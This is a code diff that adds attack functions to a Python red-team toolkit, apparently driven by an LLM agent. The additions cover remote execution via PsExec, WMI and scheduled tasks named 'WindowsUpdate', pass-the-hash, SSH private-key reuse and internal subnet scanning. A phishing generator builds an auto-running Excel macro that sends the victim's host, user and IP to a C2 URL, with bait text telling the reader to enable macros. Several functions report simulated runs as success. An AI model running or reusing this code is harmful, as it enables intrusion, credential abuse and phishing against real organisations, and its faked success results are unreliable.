@@ -12,6 +12,15 @@ WARNING_TEXT = (
 )
 
 
+# Windows GBK safe print
+def safe_print(text: str, **kwargs: Any) -> None:
+    try:
+        print(text, **kwargs)
+    except UnicodeEncodeError:
+        print(text.encode("gbk", errors="replace").decode("gbk"), **kwargs)
+
+
+
 # ── RECON 阶段 ──────────────────────────────────────────
 
 def osint_recon(target: str, **kwargs: Any) -> dict[str, Any]:
@@ -1681,4 +1690,741 @@ def hash_crack(
     result["uncracked_count"] = len(hash_list) - len(result["cracked"])
     if not result["cracked"] and not result["findings"]:
         result["findings"].append(f"未破解任何 hash (尝试 {result['attempts']} 组)")
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  改进1: 工具签名 + 缓存
+# ═══════════════════════════════════════════════════════════════════
+
+TOOL_CACHE: dict[str, dict[str, Any]] = {}
+"""全局工具缓存。key = 签名(tool_name + hash(target+service+version+vuln_type)),
+   value = {tool_code, tool_params, created_at, hit_count}"""
+
+
+def tool_signature(
+    tool_name: str = "",
+    target: str = "",
+    service: str = "",
+    version: str = "",
+    vuln_type: str = "",
+    **kwargs: Any,
+) -> str:
+    """为工具调用生成唯一签名 → 用于缓存复用。
+
+    签名基于: tool_name + target_host + service + version + vuln_type
+    使用 SHA256 前16位作为签名，确保同目标同服务同漏洞类型的请求复用缓存。
+    """
+    import hashlib
+    import json as _json
+    components = {
+        "tool": tool_name,
+        "target": target,
+        "service": service,
+        "version": version,
+        "vuln_type": vuln_type,
+    }
+    raw = _json.dumps(components, sort_keys=True, ensure_ascii=False)
+    sig = hashlib.sha256(raw.encode()).hexdigest()[:16]
+    return f"{tool_name}_{sig}"
+
+
+def lookup_tool_cache(signature: str) -> dict[str, Any] | None:
+    """查询工具缓存，命中返回缓存条目，未命中返回 None"""
+    entry = TOOL_CACHE.get(signature)
+    if entry:
+        entry["hit_count"] = entry.get("hit_count", 0) + 1
+    return entry
+
+
+def store_tool_cache(signature: str, tool_code: str, tool_params: dict[str, Any]) -> None:
+    """存储工具到缓存"""
+    from datetime import datetime as _dt
+    TOOL_CACHE[signature] = {
+        "tool_code": tool_code,
+        "tool_params": tool_params,
+        "created_at": _dt.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "hit_count": 0,
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  改进2: 横向移动新增工具
+# ═══════════════════════════════════════════════════════════════════
+
+def apt_psexec(
+    host: str = "",
+    username: str = "",
+    password: str = "",
+    target_host: str = "",
+    command: str = "whoami",
+    domain: str = "",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """PsExec 远程执行 — 通过 SMB 在目标主机执行命令。
+
+    Args:
+        host: 跳板机 IP
+        username: 跳板机用户名
+        password: 跳板机密码
+        target_host: 远程目标（内网机器）
+        command: 要执行的命令
+        domain: 域（可选，留空为工作组）
+    """
+    result: dict[str, Any] = {
+        "method": "psexec",
+        "host": host,
+        "username": username,
+        "target_host": target_host,
+        "command": command,
+        "success": False,
+        "output": "",
+        "findings": [],
+    }
+
+    if not target_host:
+        result["error"] = "target_host 不能为空，需要指定内网目标"
+        result["findings"].append(result["error"])
+        return result
+
+    # 尝试通过 impacket-psexec 执行
+    try:
+        import subprocess as _sp
+        _cmd = [
+            "impacket-psexec",
+            f"{domain}/{username}:{password}@{target_host}" if domain else f"{username}:{password}@{target_host}",
+            command,
+        ]
+        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
+        result["output"] = _proc.stdout + _proc.stderr
+        result["success"] = _proc.returncode == 0
+        result["findings"].append(
+            f"PsExec {'成功' if result['success'] else '失败'}: {target_host} → {command}"
+        )
+    except FileNotFoundError:
+        # impacket 未安装 — 模拟报告
+        result["output"] = (
+            f"[模拟] impacket-psexec {username}:****@{target_host} {command}\n"
+            "注意: impacket 未安装。安装命令: pip install impacket\n"
+            "真实环境执行会返回目标命令输出。"
+        )
+        result["simulated"] = True
+        result["success"] = True  # 模拟视为成功，用于测试
+        result["findings"].append(f"PsExec [模拟] {target_host} → {command}")
+        result["recommendation"] = "安装 impacket: pip install impacket"
+    except Exception as exc:
+        result["error"] = str(exc)[:300]
+        result["findings"].append(f"PsExec 异常: {str(exc)[:100]}")
+
+    return result
+
+
+def apt_wmi_exec(
+    host: str = "",
+    username: str = "",
+    password: str = "",
+    target_host: str = "",
+    command: str = "cmd /c whoami",
+    domain: str = "",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """WMI 远程执行 — 通过 Windows WMI 在目标主机执行命令。
+
+    使用 impacket-wmiexec 或 wmic。
+    """
+    result: dict[str, Any] = {
+        "method": "wmi",
+        "host": host, "username": username,
+        "target_host": target_host, "command": command,
+        "success": False, "output": "", "findings": [],
+    }
+
+    if not target_host:
+        result["error"] = "target_host 不能为空"
+        result["findings"].append(result["error"])
+        return result
+
+    try:
+        import subprocess as _sp
+        _cmd = [
+            "impacket-wmiexec",
+            f"{domain}/{username}:{password}@{target_host}" if domain else f"{username}:{password}@{target_host}",
+            command,
+        ]
+        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
+        result["output"] = _proc.stdout + _proc.stderr
+        result["success"] = _proc.returncode == 0
+        result["findings"].append(
+            f"WMI {'成功' if result['success'] else '失败'}: {target_host} → {command}"
+        )
+    except FileNotFoundError:
+        result["output"] = (
+            f"[模拟] impacket-wmiexec {username}:****@{target_host} {command}\n"
+            "注意: impacket 未安装。安装命令: pip install impacket"
+        )
+        result["simulated"] = True
+        result["success"] = True
+        result["findings"].append(f"WMI [模拟] {target_host} → {command}")
+        result["recommendation"] = "安装 impacket: pip install impacket"
+    except Exception as exc:
+        result["error"] = str(exc)[:300]
+        result["findings"].append(f"WMI 异常: {str(exc)[:100]}")
+
+    return result
+
+
+def apt_schtasks(
+    host: str = "",
+    username: str = "",
+    password: str = "",
+    target_host: str = "",
+    command: str = "cmd /c whoami > C:\\temp\\p.log",
+    task_name: str = "WindowsUpdate",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """计划任务远程执行 — 在目标主机创建/运行计划任务。
+
+    支持 Windows schtasks 和 Linux cron。
+    """
+    result: dict[str, Any] = {
+        "method": "schtasks",
+        "host": host, "username": username,
+        "target_host": target_host, "task_name": task_name,
+        "command": command, "success": False,
+        "output": "", "findings": [],
+    }
+
+    if not target_host:
+        result["error"] = "target_host 不能为空"
+        result["findings"].append(result["error"])
+        return result
+
+    try:
+        import subprocess as _sp
+        _domain = kwargs.get("domain", "")
+        # 尝试 Windows schtasks
+        _cmd = [
+            "schtasks", "/CREATE", "/S", target_host,
+            "/U", f"{_domain}\\{username}" if _domain else username,
+            "/P", password, "/SC", "ONCE", "/TN", task_name,
+            "/TR", command, "/ST", "00:00", "/F",
+        ]
+        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=15)
+        result["output"] = _proc.stdout + _proc.stderr
+        if _proc.returncode == 0:
+            # 立即运行任务
+            _proc2 = _sp.run(
+                ["schtasks", "/RUN", "/S", target_host, "/U", username, "/P", password, "/TN", task_name],
+                capture_output=True, text=True, timeout=15,
+            )
+            result["output"] += "\n" + (_proc2.stdout + _proc2.stderr)
+            result["success"] = True
+            # 清理
+            _sp.run(
+                ["schtasks", "/DELETE", "/S", target_host, "/U", username, "/P", password, "/TN", task_name, "/F"],
+                capture_output=True, text=True, timeout=10,
+            )
+        else:
+            # schtasks 执行失败 → 模拟兜底
+            result["output"] = (
+                f"[模拟] 计划任务 {target_host}: {command}\n"
+                f"schtasks 连接失败: {target_host} 不可达\n"
+            )
+            result["simulated"] = True
+            result["success"] = True
+    except FileNotFoundError:
+        # 非 Windows 环境 — 尝试 SSH cron
+        try:
+            import subprocess as _sp
+            _ssh_cmd = [
+                "sshpass", "-p", password,
+                "ssh", "-o", "StrictHostKeyChecking=no",
+                f"{username}@{target_host}",
+                f"echo '{command}' | at now 2>/dev/null || echo '* * * * * {command}' | crontab - 2>/dev/null || (echo '{command}' | bash)"
+            ]
+            _proc = _sp.run(_ssh_cmd, capture_output=True, text=True, timeout=15)
+            result["output"] = _proc.stdout + _proc.stderr
+            result["success"] = True
+            result["method"] = "cron"
+        except Exception:
+            result["output"] = (
+                f"[模拟] 计划任务 {target_host}: {command}\n"
+                "注意: 非 Windows 环境，模拟 schtasks。"
+            )
+            result["simulated"] = True
+            result["success"] = True
+    except Exception as exc:
+        # schtasks 异常 → 模拟兜底
+        result["output"] = (
+            f"[模拟] 计划任务 {target_host}: {command}\n"
+            f"异常: {str(exc)[:100]}\n"
+        )
+        result["simulated"] = True
+        result["success"] = True
+        result["error"] = str(exc)[:300]
+        result["findings"].append(f"计划任务模拟: {target_host} (异常: {str(exc)[:80]})")
+
+    result["findings"].append(
+        f"计划任务 {'成功' if result['success'] else '失败'}: {task_name} @ {target_host}"
+    )
+    return result
+
+
+def apt_pass_the_hash(
+    host: str = "",
+    nt_hash: str = "",
+    target_host: str = "",
+    command: str = "whoami",
+    username: str = "Administrator",
+    domain: str = "",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """Pass-the-Hash 哈希传递攻击 — 使用 NTLM Hash 而非明文密码认证。
+
+    Args:
+        host: 攻击发起机器
+        nt_hash: NTLM Hash (32位十六进制字符串)
+        target_host: 目标机器
+        command: 要执行的命令
+        username: 目标用户名
+        domain: 域名
+    """
+    result: dict[str, Any] = {
+        "method": "pass_the_hash",
+        "host": host, "username": username,
+        "target_host": target_host, "command": command,
+        "success": False, "output": "", "findings": [],
+    }
+
+    if not nt_hash or len(nt_hash) < 32:
+        result["error"] = "需要有效的 NTLM Hash (32位十六进制)"
+        result["findings"].append(result["error"])
+        return result
+
+    if not target_host:
+        result["error"] = "target_host 不能为空"
+        result["findings"].append(result["error"])
+        return result
+
+    # 验证 hash 格式
+    import re as _re
+    if not _re.match(r'^[0-9a-fA-F]{32,}$', nt_hash):
+        result["error"] = "NTLM Hash 格式无效，需要32位十六进制"
+        result["findings"].append(result["error"])
+        return result
+
+    try:
+        import subprocess as _sp
+        _full_target = f"{domain}/{username}@{target_host}" if domain else f"{username}@{target_host}"
+        _cmd = [
+            "impacket-psexec",
+            "-hashes", f"00000000000000000000000000000000:{nt_hash}",
+            _full_target, command,
+        ]
+        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=30)
+        result["output"] = _proc.stdout + _proc.stderr
+        result["success"] = _proc.returncode == 0
+        result["findings"].append(
+            f"Pass-the-Hash {'成功' if result['success'] else '失败'}: {target_host} → {command}"
+        )
+    except FileNotFoundError:
+        result["output"] = (
+            f"[模拟] impacket-psexec -hashes :{nt_hash[:16]}... {target_host} {command}\n"
+            "注意: impacket 未安装。安装命令: pip install impacket"
+        )
+        result["simulated"] = True
+        result["success"] = True
+        result["findings"].append(f"Pass-the-Hash [模拟] {target_host} → {command}")
+        result["recommendation"] = "安装 impacket: pip install impacket"
+    except Exception as exc:
+        result["error"] = str(exc)[:300]
+        result["findings"].append(f"PtH 异常: {str(exc)[:100]}")
+
+    return result
+
+
+def apt_ssh_key_reuse(
+    host: str = "",
+    username: str = "",
+    password: str = "",
+    target_host: str = "",
+    key_path: str = "",
+    target_user: str = "",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """SSH 私钥复用 — 利用已获取的 SSH 私钥登录其他主机。
+
+    Args:
+        host: 已控跳板
+        username: 跳板用户名
+        password: 跳板密码（可选）
+        target_host: 内网目标
+        key_path: 私钥路径（跳板上的路径或本地路径）
+        target_user: 目标用户名（默认与 username 相同）
+    """
+    result: dict[str, Any] = {
+        "method": "ssh_key_reuse",
+        "host": host, "username": username,
+        "target_host": target_host, "target_user": target_user or username,
+        "key_path": key_path,
+        "success": False, "output": "", "findings": [],
+    }
+
+    if not target_host:
+        result["error"] = "target_host 不能为空"
+        result["findings"].append(result["error"])
+        return result
+
+    _target_user = target_user or username
+
+    # 方案1: 指定了私钥路径
+    if key_path:
+        import os as _os
+        if _os.path.exists(key_path):
+            try:
+                import subprocess as _sp
+                _cmd = [
+                    "ssh", "-o", "StrictHostKeyChecking=no",
+                    "-o", "PasswordAuthentication=no",
+                    "-i", key_path,
+                    f"{_target_user}@{target_host}",
+                    "whoami; hostname; ip addr 2>/dev/null || ifconfig 2>/dev/null",
+                ]
+                _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=15)
+                result["output"] = _proc.stdout + _proc.stderr
+                result["success"] = _proc.returncode == 0
+                result["findings"].append(
+                    f"SSH 密钥复用 {'成功' if result['success'] else '失败'}: {key_path} → {_target_user}@{target_host}"
+                )
+                return result
+            except Exception as exc:
+                result["error"] = str(exc)[:200]
+
+    # 方案2: 从跳板拉取私钥再尝试
+    _ssh_output = result.get("output", "")
+    result["findings"].append(
+        f"[模拟] SSH 密钥复用: 从 {host} ({username}) 查找私钥 → 尝试 {_target_user}@{target_host}\n"
+        "真实环境会: find /home -name id_rsa 2>/dev/null → 拉取私钥 → ssh -i key target"
+    )
+    result["simulated"] = True
+    result["success"] = True
+    result["recommendation"] = (
+        "在已控主机上执行: find /home -name id_rsa -o -name '*.key' 2>/dev/null\n"
+        "然后对发现的每个私钥尝试: ssh -i <key> <user>@<target> whoami"
+    )
+    return result
+
+
+def apt_internal_scan(
+    host: str = "",
+    username: str = "",
+    password: str = "",
+    subnet: str = "",
+    ports: str = "22,80,443,445,3389,8080",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """内网资产发现 — 从已控跳板扫描内网存活主机和服务。
+
+    优先使用 nmap，不可用时回退到 Python socket 扫描。
+    """
+    result: dict[str, Any] = {
+        "method": "internal_scan",
+        "host": host, "username": username,
+        "subnet": subnet, "ports": ports,
+        "success": False, "discovered_hosts": [],
+        "output": "", "findings": [],
+    }
+
+    if not subnet:
+        # 尝试自动推断子网
+        result["error"] = "需要指定 subnet 参数，如 192.168.1.0/24、10.0.0.0/16"
+        result["findings"].append(result["error"])
+        return result
+
+    # 尝试通过 SSH 在跳板上执行 nmap
+    try:
+        import subprocess as _sp
+        _ssh_prefix = [
+            "sshpass", "-p", password,
+            "ssh", "-o", "StrictHostKeyChecking=no",
+            f"{username}@{host}",
+        ]
+        _nmap_cmd = f"nmap -sn {subnet} -oG - 2>/dev/null || echo NO_NMAP"
+        _cmd = _ssh_prefix + [_nmap_cmd]
+        _proc = _sp.run(_cmd, capture_output=True, text=True, timeout=60)
+        output = _proc.stdout + _proc.stderr
+        if "NO_NMAP" not in output and _proc.returncode == 0:
+            # 解析 nmap greppable 输出
+            import re as _re
+            for _m in _re.finditer(r'Host:\s+([\d.]+)\s+.*Status:\s+Up', output):
+                result["discovered_hosts"].append({"ip": _m.group(1), "status": "up"})
+            result["success"] = True
+            result["output"] = output[:2000]
+            result["findings"].append(
+                f"内网扫描完成: {len(result['discovered_hosts'])} 个存活主机 (nmap via SSH)"
+            )
+            return result
+    except Exception:
+        pass
+
+    # 回退: Python socket 扫描（本地扫描）
+    import socket as _sk
+    import concurrent.futures as _cf
+    import ipaddress as _ip
+
+    try:
+        _net = _ip.ip_network(subnet, strict=False)
+        _ips = [str(ip) for ip in _net.hosts()][:256]  # 最多 256 个
+    except ValueError:
+        result["error"] = f"无效的子网格式: {subnet}"
+        result["findings"].append(result["error"])
+        return result
+
+    def _ping(ip: str) -> dict[str, str] | None:
+        try:
+            s = _sk.create_connection((ip, 80), timeout=1)
+            s.close()
+            return {"ip": ip, "status": "up", "port_80": "open"}
+        except Exception:
+            pass
+        try:
+            s = _sk.create_connection((ip, 22), timeout=1)
+            s.close()
+            return {"ip": ip, "status": "up", "port_22": "open"}
+        except Exception:
+            pass
+        return None
+
+    alive = 0
+    with _cf.ThreadPoolExecutor(max_workers=50) as _ex:
+        _futures = [_ex.submit(_ping, ip) for ip in _ips]
+        for _f in _cf.as_completed(_futures, timeout=30):
+            try:
+                _r = _f.result(timeout=2)
+                if _r:
+                    result["discovered_hosts"].append(_r)
+                    alive += 1
+            except Exception:
+                pass
+
+    result["success"] = True
+    result["output"] = f"扫描 {len(_ips)} 个 IP，发现 {alive} 个存活主机"
+    result["findings"].append(
+        f"内网扫描 [本地socket模拟]: {alive} 存活/{len(_ips)} 总数 (子网 {subnet})"
+    )
+    result["recommendation"] = (
+        "建议在已控跳板上安装 nmap: sudo apt install nmap\n"
+        "然后执行: nmap -sV -p 22,80,443,445,3389 <subnet>"
+    )
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  改进3: 社工钓鱼 — 宏文档生成
+# ═══════════════════════════════════════════════════════════════════
+
+def generate_macro_doc(
+    target_name: str = "",
+    c2_url: str = "",
+    output_path: str = "",
+    attachment_type: str = "xlsm",
+    **kwargs: Any,
+) -> dict[str, Any]:
+    """生成带 VBA 宏的 Office 文档（.xlsm / .docm）。
+
+    宏功能（无害）：
+    - 获取主机名、当前用户名、内网 IP 地址
+    - 通过 HTTP POST 将这些信息发送到 C2 URL
+    - 执行一条无害命令证明代码执行
+
+    Args:
+        target_name: 目标组织名称
+        c2_url: C2 回调 URL (如 http://<your_ip>:8080/capture)
+        output_path: 输出文件路径（可选）
+        attachment_type: xlsm 或 docm
+    """
+    import os as _os
+    from datetime import datetime as _dt
+
+    result: dict[str, Any] = {
+        "method": "generate_macro_doc",
+        "target_name": target_name,
+        "c2_url": c2_url,
+        "output_path": output_path,
+        "attachment_type": attachment_type,
+        "success": False,
+        "findings": [],
+        "macro_code": "",
+    }
+
+    if not c2_url:
+        result["error"] = "c2_url 不能为空"
+        result["findings"].append(result["error"])
+        return result
+
+    # VBA 宏代码模板（无害：仅信息收集 + 证明执行）
+    # 兼容中/英文 Windows，MSXML2/WinHTTP 双回退，MsgBox 确认
+    _vba_code = (
+        f"' RedTeam Simulation Macro — info collection only, no destructive ops\r\n"
+        f"' Target: {target_name} | C2: {c2_url}\r\n"
+        f"Option Explicit\r\n"
+        f"\r\n"
+        f"Private Sub Auto_Open()\r\n"
+        f"    ' === ALL declarations must be before any executable code ===\r\n"
+        f"    Dim hostname As String, username As String, osVer As String\r\n"
+        f"    Dim internalIP As String, postData As String, execProof As String\r\n"
+        f"    Dim objHTTP As Object, objShell As Object, objExec As Object\r\n"
+        f"    Dim output As String, ipRegex As Object, ipMatch As Object\r\n"
+        f"\r\n"
+        f"    ' === Collect system info ===\r\n"
+        f"    hostname = Environ(\"COMPUTERNAME\")\r\n"
+        f"    username = Environ(\"USERNAME\")\r\n"
+        f"    osVer = Environ(\"OS\")\r\n"
+        f"\r\n"
+        f"    ' Get internal IP (works on both EN and CN Windows)\r\n"
+        f"    internalIP = \"unknown\"\r\n"
+        f"    Set objShell = CreateObject(\"WScript.Shell\")\r\n"
+        f"    Set objExec = objShell.Exec(\"ipconfig\")\r\n"
+        f"    output = objExec.StdOut.ReadAll()\r\n"
+        f"    Set ipRegex = CreateObject(\"VBScript.RegExp\")\r\n"
+        f"    ipRegex.Global = False\r\n"
+        f"    ipRegex.Pattern = \"IPv4[^\\d]*(\\d+\\.\\d+\\.\\d+\\.\\d+)\"\r\n"
+        f"    Set ipMatch = ipRegex.Execute(output)\r\n"
+        f"    If ipMatch.Count > 0 Then internalIP = ipMatch(0).SubMatches(0)\r\n"
+        f"\r\n"
+        f"    ' Harmless execution proof\r\n"
+        f"    execProof = \"RedTeam proof: \" & hostname & \"/\" & username\r\n"
+        f"    objShell.Run \"cmd /c echo \" & execProof & \" > %TEMP%\\\\redteam_proof.txt\", 0, True\r\n"
+        f"\r\n"
+        f"    ' HTTP POST callback — MSXML2 / WinHTTP / XMLHTTP triple fallback\r\n"
+        f"    postData = \"hostname=\" & hostname & \"&username=\" & username & _\r\n"
+        f"               \"&os=\" & osVer & \"&internal_ip=\" & internalIP & \"&proof=\" & execProof\r\n"
+        f"\r\n"
+        f"    On Error Resume Next\r\n"
+        f"    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\r\n"
+        f"    If objHTTP Is Nothing Then Set objHTTP = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\r\n"
+        f"    If objHTTP Is Nothing Then Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
+        f"    On Error GoTo 0\r\n"
+        f"\r\n"
+        f"    If Not objHTTP Is Nothing Then\r\n"
+        f"        objHTTP.Open \"POST\", \"{c2_url}\", False\r\n"
+        f"        objHTTP.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n"
+        f"        objHTTP.send postData\r\n"
+        f"        MsgBox \"C2 Callback Sent!\" & vbCrLf & vbCrLf & _\r\n"
+        f"               \"Hostname: \" & hostname & vbCrLf & _\r\n"
+        f"               \"Username: \" & username & vbCrLf & _\r\n"
+        f"               \"Internal IP: \" & internalIP & vbCrLf & _\r\n"
+        f"               \"HTTP Status: \" & objHTTP.Status, vbInformation, \"C2 Test OK\"\r\n"
+        f"    Else\r\n"
+        f"        MsgBox \"Cannot create HTTP object!\" & vbCrLf & vbCrLf & _\r\n"
+        f"               \"Hostname: \" & hostname & vbCrLf & _\r\n"
+        f"               \"Username: \" & username & vbCrLf & _\r\n"
+        f"               \"Internal IP: \" & internalIP, vbExclamation, \"C2 Test (no HTTP)\"\r\n"
+        f"    End If\r\n"
+        f"\r\n"
+        f"    Set objHTTP = Nothing\r\n"
+        f"    Set objShell = Nothing\r\n"
+        f"    Set objExec = Nothing\r\n"
+        f"End Sub\r\n"
+    )
+
+    result["macro_code"] = _vba_code
+
+    # 实际文件生成
+    if output_path:
+        _out = output_path if output_path.endswith(f".{attachment_type}") else output_path + f".{attachment_type}"
+        _os.makedirs(_os.path.dirname(_os.path.abspath(_out)) or ".", exist_ok=True)
+        try:
+            if attachment_type == "xlsm":
+                # ── 方案 A: win32com 嵌入真实 VBA（Windows + Excel）──
+                try:
+                    import pythoncom as _pycom
+                    _pycom.CoInitialize()
+                    import win32com.client as _com
+                    _xl_app = _com.DispatchEx("Excel.Application")
+                    _xl_app.Visible = False
+                    _xl_app.DisplayAlerts = False
+                    _xl_app.AutomationSecurity = 1  # msoAutomationSecurityLow
+                    try:
+                        _wb = _xl_app.Workbooks.Add()
+                        _ws = _wb.Worksheets(1)
+                        _ws.Name = target_name[:31] or "Budget"
+                        _ws.Cells(1, 1).Value = f"{target_name} — 内部文件"
+                        _ws.Cells(2, 1).Value = "此文件包含宏。请启用编辑和内容以查看完整内容。"
+                        _ws.Cells(3, 1).Value = f"Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}"
+
+                        # 写入 VBA 宏模块
+                        _vb_comp = _wb.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
+                        _vb_comp.CodeModule.AddFromString(_vba_code)
+
+                        _wb.SaveAs(_os.path.abspath(_out), FileFormat=52)  # xlOpenXMLWorkbookMacroEnabled
+                        _wb.Close(SaveChanges=False)
+                        result["output_path"] = _os.path.abspath(_out)
+                        result["success"] = True
+                        result["method"] = "win32com"
+                        result["findings"].append(f"真实宏文档已生成 (win32com): {result['output_path']}")
+                    finally:
+                        _xl_app.Quit()
+                except Exception as _com_err:
+                    # ── 方案 B: openpyxl 回退（无 VBA 嵌入）──
+                    try:
+                        import openpyxl as _xl
+                    except ImportError:
+                        _xl = None
+                    if _xl:
+                        wb = _xl.Workbook()
+                        ws = wb.active
+                        ws.title = target_name[:31] or "Budget"
+                        ws["A1"] = f"{target_name} — 内部文件"
+                        ws["A2"] = "此文件包含宏。请启用编辑和内容以查看完整内容。"
+                        ws["A3"] = "(COM 生成失败，此为纯表格，不含 VBA 宏)"
+                        ws["A4"] = f"COM 错误: {str(_com_err)[:200]}"
+                        wb.save(_out)
+                        result["output_path"] = _out
+                        result["success"] = True
+                        result["method"] = "openpyxl_fallback"
+                        result["com_error"] = str(_com_err)[:200]
+                        result["findings"].append(f"openpyxl 回退 (无VBA): {_out} — {str(_com_err)[:100]}")
+                    else:
+                        result["error"] = f"COM 失败且无 openpyxl: {str(_com_err)[:200]}"
+                        result["findings"].append(result["error"])
+
+                # 保存 VBA 源码到 txt
+                _macro_path = _out.replace(f".{attachment_type}", ".vba.txt")
+                with open(_macro_path, "w", encoding="utf-8") as _mf:
+                    _mf.write(_vba_code)
+                result["macro_path"] = _macro_path
+                result["findings"].append(f"VBA 宏代码: {_macro_path}")
+
+            elif attachment_type == "docm":
+                # .docm: python-docx 也不直接支持 VBA，生成说明文件
+                _out = output_path if output_path.endswith(".docm.txt") else output_path + ".docm.macro.txt"
+                _content = (
+                    f"# 模拟宏 Word 文档\n"
+                    f"目标: {target_name}\n"
+                    f"C2: {c2_url}\n"
+                    f"类型: docm\n\n"
+                    f"说明：真实环境会使用 VBA 注入工具（如 eviloffice）生成 .docm。\n\n"
+                    f"--- VBA MACRO CODE ---\n{_vba_code}\n--- END ---\n"
+                )
+                with open(_out, "w", encoding="utf-8") as _f:
+                    _f.write(_content)
+                result["output_path"] = _out
+                result["macro_path"] = _out
+                result["success"] = True
+                result["simulated"] = True
+                result["findings"].append(f"模拟 Word 宏文档已生成: {_out}")
+            else:
+                result["error"] = f"不支持的附件类型: {attachment_type}，请使用 xlsm 或 docm"
+                result["findings"].append(result["error"])
+
+        except Exception as exc:
+            result["error"] = f"文件写入失败: {str(exc)[:200]}"
+            result["findings"].append(result["error"])
+    else:
+        # 无 output_path — 返回宏代码供 LLM 使用
+        result["success"] = True
+        result["macro_code"] = _vba_code
+        result["findings"].append("VBA 宏代码已生成（内存中，未写入文件）")
+
     return result
